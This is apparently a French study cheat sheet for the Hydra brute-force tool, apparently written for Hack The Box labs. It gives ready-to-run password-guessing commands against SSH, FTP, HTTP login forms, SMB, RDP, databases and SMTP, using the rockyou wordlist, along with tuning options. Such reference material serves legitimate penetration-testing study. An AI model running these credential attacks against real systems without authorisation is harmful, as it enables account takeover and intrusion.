**Hydra - Récap complet**

---

**Syntaxe de base**

```bash
hydra -l USER -p PASS SERVICE://TARGET
hydra -l USER -P WORDLIST SERVICE://TARGET
hydra -L USERLIST -P WORDLIST SERVICE://TARGET
```

---

**SSH**

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET
hydra -L users.txt -P rockyou.txt ssh://TARGET -t 4
hydra -l admin -P rockyou.txt ssh://TARGET -s 2222  # port custom
```

---

**FTP**

```bash
hydra -l admin -P rockyou.txt ftp://TARGET
hydra -L users.txt -P rockyou.txt ftp://TARGET -t 10
```

---

**HTTP POST (formulaire)**

```bash
# Syntaxe : "PATH:PARAMS:ECHEC"
hydra -l admin -P rockyou.txt TARGET http-post-form \
  "/?login=true:user=^USER^&password=^PASS^:Invalid"

# Avec cookie de session
hydra -l admin -P rockyou.txt TARGET http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:incorrect:H=Cookie: PHPSESSID=abc123"

# HTTPS
hydra -l admin -P rockyou.txt TARGET https-post-form \
  "/login:user=^USER^&pass=^PASS^:Wrong"
```

---

**HTTP GET**

```bash
hydra -l admin -P rockyou.txt TARGET http-get /admin
hydra -l admin -P rockyou.txt TARGET http-get-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid"
```

---

**HTTP Basic Auth**

```bash
hydra -l admin -P rockyou.txt TARGET http-head /
hydra -l admin -P rockyou.txt http-basic://TARGET
```

---

**SMB**

```bash
hydra -l administrator -P rockyou.txt smb://TARGET
hydra -L users.txt -P rockyou.txt smb://TARGET
```

---

**RDP**

```bash
hydra -l administrator -P rockyou.txt rdp://TARGET
hydra -L users.txt -P rockyou.txt rdp://TARGET -t 4
```

---

**MySQL / PostgreSQL**

```bash
hydra -l root -P rockyou.txt mysql://TARGET
hydra -l postgres -P rockyou.txt postgres://TARGET
```

---

**SMTP**

```bash
hydra -l user@domain.com -P rockyou.txt smtp://TARGET
hydra -l admin -P rockyou.txt smtp://TARGET:587
```

---

**Options utiles**

```bash
-t 4       # threads (SSH max 4, HTTP jusqu'à 64)
-T 20      # tâches parallèles globales
-s PORT    # port custom
-S         # SSL
-v         # verbose
-V         # verbose + affiche chaque tentative
-f         # stop au premier succès
-o out.txt # sauvegarde résultats
-R         # reprendre une session interrompue
-e nsr     # teste aussi : n=blank, s=login=pass, r=pass inversé
```

---

**Exemple complet HTB**

```bash
# SSH avec verbose
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.X -t 4 -V

# HTTP form avec détection échec par message
hydra -l admin -P rockyou.txt 10.10.11.X http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -V -f
```
